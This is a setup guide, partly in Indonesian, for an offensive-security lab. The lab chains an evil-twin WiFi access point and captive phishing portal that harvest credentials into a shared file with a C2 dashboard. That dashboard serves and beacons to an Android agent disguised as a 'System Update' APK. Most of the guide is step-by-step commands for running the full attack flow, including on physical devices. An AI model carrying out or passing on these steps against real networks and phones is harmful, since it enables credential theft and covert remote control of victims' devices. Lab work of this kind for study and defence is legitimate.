# Setup Guide — Hybrid MITM-C2 Lab

## Prasyarat Hardware

| Item | Spesifikasi Minimum |
|---|---|
| **WiFi Adapter** | Monitor mode + AP mode (e.g., Alfa AWUS036ACH, TP-Link WN722N) |
| **OS** | Kali Linux / Debian / Ubuntu |
| **RAM** | 8GB+ (emulator perlu 4GB+) |
| **Disk** | 10GB free |
| **Android Device** | Android 7.0+ (untuk testing fisik) |

## 1. Install System Dependencies

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Web server + PHP
sudo apt install -y lighttpd php-cgi php-cli

# Android tools
sudo apt install -y adb apksigner zipalign

# Python
sudo apt install -y python3 python3-pip
pip3 install flask

# Build tools (optional, for APK rebuilding)
sudo apt install -y openjdk-17-jdk aapt2

# Network tools (usually pre-installed on Kali)
sudo apt install -y hostapd dnsmasq iw
```

## 2. Verify WiFi Adapter

```bash
# Check adapter supports monitor mode + AP mode
iw list | grep -A5 "Supported interface modes" | grep -E "AP|monitor"
# Should show: * AP * monitor

# List WiFi interfaces
iwconfig
# Find your adapter (e.g., wlan2)

# Test monitor mode
sudo airmon-ng start wlan2
sudo airmon-ng stop wlan2mon
```

## 3. Configure Android Emulator (AVD)

```bash
# Verify emulator is running
adb devices
# Should show: emulator-5554   device

# If not running, create and start one:
# Android Studio → AVD Manager → Create Virtual Device → Start
# Or CLI:
$HOME/Android/Sdk/emulator/emulator -avd Pixel_6_API_34 -writable-system
```

## 4. Install Maestro

```bash
# Install Maestro for UI automation
curl -fsSL https://get.maestro.mobile.dev | bash

# Add to PATH (add to ~/.zshrc or ~/.bashrc)
export PATH="$HOME/.maestro/bin:$PATH"

# Verify
maestro --version
```

## 5. Clone / Setup Project

```bash
# Project already at:
cd /home/d4x13/Documents/MYPROJECT/TOOLS/hybrid-mitm-c2

# Verify structure
ls -la
# Should see: WEF/ server/ agent/ flows/ scripts/ docs/
```

## 6. Verify WEF Configuration

```bash
cd WEF

# Check the default config
cat default.cfg

# Runs as root (required for WiFi operations)
sudo ./wef --help
```

## 7. Test Dashboard

```bash
# Terminal 1: Start dashboard
python3 c2_server.py
# Output should show:
#   Dashboard:      http://0.0.0.0:4443/
#   C2 Beacon:      http://0.0.0.0:4443/beacon
#   APK Download:   http://0.0.0.0:4443/download

# Open browser
firefox http://127.0.0.1:4443/
# Should show: "OffSec Lab — Dashboard" with empty tables
```

## 8. Test WEF Evil Twin

```bash
# Terminal 2:
cd WEF
sudo ./wef

# Menu:
#   7) Evil Twin attack
#   → Select interface: wlan2
#   → Choose target ESSID or manual
#   → Template: 2 (custom)
#   → Select: google (or any)
#   → Attack starts

# Check if AP is up:
ip addr show wlan2
# Should show: inet 10.0.221.1/24

# Check if lighttpd is serving:
curl http://10.0.221.1/
# Should return HTML
```

## 9. Test Full Flow

```bash
# Terminal 1: Dashboard
python3 c2_server.py

# Terminal 2: WEF
cd WEF && sudo ./wef

# Terminal 3: Maestro (after WEF running)
adb devices  # verify emulator
~/.maestro/bin/maestro test flows/full-attack-flow.yaml

# Check dashboard for credentials
firefox http://127.0.0.1:4443/

# Install APK on emulator
adb install agent/SecurityUpdate.apk

# Activate agent
~/.maestro/bin/maestro test flows/agent-activate.yaml

# Or on physical device:
# 1. Connect to AP WiFi
# 2. Browser auto-opens portal
# 3. Enter credentials
# 4. Download & install APK
# 5. Open "System Update" → START AGENT
```

## 10. Cleanup

```bash
# Stop WEF: Ctrl+C in WEF terminal

# Stop dashboard: Ctrl+C in Python terminal

# Restore network
sudo systemctl start NetworkManager
sudo airmon-ng stop wlan2mon 2>/dev/null
sudo iwconfig wlan2 mode managed
```

## Notes

- WEF assigns `10.0.221.1/24` to the AP interface (hardcoded in `wef` line 6768)
- The universal APK auto-detects the gateway IP — no rebuild needed for different networks
- If changing AP IP, update WEF `wef` line 6768 and rebuild APK
- Dashboard runs on port 4443 (Flask, threaded mode)
- lighttpd runs on port 80 (captive portal + PHP proxy for C2)
- Shared credential file: `creds.jsonl` in project root
